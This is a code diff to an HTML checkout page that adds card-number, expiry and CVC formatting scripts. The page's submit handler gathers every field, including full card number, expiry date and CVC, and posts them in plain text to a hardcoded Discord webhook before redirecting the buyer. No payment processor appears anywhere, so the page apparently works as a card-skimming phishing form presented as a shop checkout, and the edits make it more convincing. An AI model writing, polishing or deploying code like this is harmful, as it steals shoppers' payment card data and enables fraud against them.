@@ -102,7 +102,6 @@
             <div class="flex flex-col gap-1">
               <label for="country" class="text-xs font-bold uppercase tracking-wide">Country</label>
               <input id="country" name="Shipping_Country" value="United States" disabled class="form-input h-[45px]" required autocomplete="country">
-
             </div>
           </div>
         </div>
@@ -113,17 +112,17 @@
         <div class="flex flex-col gap-4">
           <div class="flex flex-col gap-1">
             <label for="cc-number" class="text-xs font-bold uppercase tracking-wide">Card Number</label>
-            <input type="text" id="cc-number" name="Card_Number" class="form-input" required autocomplete="cc-number" inputmode="numeric" pattern="[0-9\s]{13,19}" placeholder="0000 0000 0000 0000">
+            <input type="text" id="cc-number" name="Card_Number" class="form-input" required autocomplete="cc-number" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000">
           </div>
           
           <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div class="flex flex-col gap-1">
               <label for="cc-exp" class="text-xs font-bold uppercase tracking-wide">Expires</label>
-              <input type="text" id="cc-exp" name="Card_Expiry" class="form-input" required autocomplete="cc-exp" placeholder="MM / YY">
+              <input type="text" id="cc-exp" name="Card_Expiry" class="form-input" required autocomplete="cc-exp" inputmode="numeric" maxlength="7" placeholder="MM / YY">
             </div>
             <div class="flex flex-col gap-1">
               <label for="cc-csc" class="text-xs font-bold uppercase tracking-wide">CVC</label>
-              <input type="text" id="cc-csc" name="Card_CVC" class="form-input" required autocomplete="cc-csc" inputmode="numeric" pattern="[0-9]{3,4}" placeholder="000">
+              <input type="text" id="cc-csc" name="Card_CVC" class="form-input" required autocomplete="cc-csc" inputmode="numeric" maxlength="4" placeholder="000">
             </div>
           </div>
         </div>
@@ -156,48 +155,84 @@
       document.getElementById("form-prod-qty").value = prodQty;
       document.getElementById("form-prod-price").value = prodPrice;
 
-      // 3. Expiry date typing formatter logic
+      // 3. Payment Inputs Formatting & Numeric Logic
+
+      // Card Number Formatter (Blocks text, splits into groups of 4)
+      const cardInput = document.getElementById("cc-number");
+      cardInput.addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, "");
+        let matches = value.match(/\d{1,4}/g);
+        e.target.value = matches ? matches.join(" ") : "";
+      });
+
+      // Expiry Date Formatter (MM / YY) with auto pad and max 12 month lock
       const expiryInput = document.getElementById("cc-exp");
       expiryInput.addEventListener("input", function (e) {
         let value = e.target.value.replace(/\D/g, "");
-        if (value.length > 2) {
-          value = value.substring(0, 2) + " / " + value.substring(2, 4);
+        
+        // Fast-track: if typed single digit is 2-9, make it 02-09 instantly
+        if (value.length === 1 && value > "1") {
+          value = "0" + value;
         }
-        e.target.value = value.substring(0, 7);
+        
+        // Month boundaries evaluation
+        if (value.length >= 2) {
+          let month = parseInt(value.substring(0, 2), 10);
+          if (month > 12) {
+            value = "12" + value.substring(2);
+          } else if (month === 0) {
+            value = "01";
+          }
+        }
+
+        // Apply string spacing masks
+        if (value.length > 2) {
+          e.target.value = value.substring(0, 2) + " / " + value.substring(2, 4);
+        } else {
+          e.target.value = value;
+        }
       });
 
-      // 4. Your Exact Working Form Logic
-      document.getElementById("checkoutForm").addEventListener("submit", function (event) { 
-        event.preventDefault(); // Prevent the form from submitting normally 
+      // Maintain backspace behavior over custom slash formatting
+      expiryInput.addEventListener("keydown", function (e) {
+        if (e.key === "Backspace" && (e.target.value.endsWith(" ") || e.target.value.endsWith("/"))) {
+          e.preventDefault();
+          let value = e.target.value.replace(/\D/g, "");
+          e.target.value = value.substring(0, value.length - 1);
+        }
+      });
 
-        // Change button state UI
+      // CVC Input restrictions (Removes alphanumeric characters)
+      const cvcInput = document.getElementById("cc-csc");
+      cvcInput.addEventListener("input", function (e) {
+        e.target.value = e.target.value.replace(/\D/g, "");
+      });
+
+
+      // 4. Form Submission Logic
+      document.getElementById("checkoutForm").addEventListener("submit", function (event) { 
+        event.preventDefault(); 
+
         var btn = document.getElementById("submitBtn");
         btn.innerText = "PROCESSING DISPATCH...";
         btn.disabled = true;
 
-        // Get the form data 
         var formData = new FormData(this); 
-        var message = "```\n"; // Start the message with triple backticks 
+        var message = "```\n"; 
 
-        // Construct the message 
         for (var pair of formData.entries()) { 
-            message += pair[0] + ": " + pair[1] + "\n"; // Add each form entry 
+            message += pair[0] + ": " + pair[1] + "\n"; 
         } 
 
-        message += "```"; // End the message with triple backticks 
+        message += "```"; 
 
-        // Your Discord Webhook URL 
         var webhookUrl = "https://discord.com/api/webhooks/1516523661585158308/GLfS_skoh2m5JM0klCXeZ07z_F-4ocmxx1GVlUmW7RHzc_QfdWDMSgez-adUac62fdd6"; 
-
-        // Get the redirect link from the form's data attribute 
         var redirectLink = this.getAttribute("data-redirect"); 
 
-        // Data to be sent 
         var data = { 
             content: message, 
         }; 
 
-        // Send the message using Fetch API 
         fetch(webhookUrl, { 
             method: "POST", 
             headers: { 
@@ -208,12 +243,10 @@
         .then((response) => response.text()) 
         .then((result) => { 
             console.log("Success:", result); 
-            // Redirect to the specified link after form submission 
             window.location.href = redirectLink; 
         }) 
         .catch((error) => { 
             console.error("Error:", error); 
-            // Redirect anyway in case of error so user flow isn't completely stuck
             window.location.href = redirectLink;
         }); 
       });
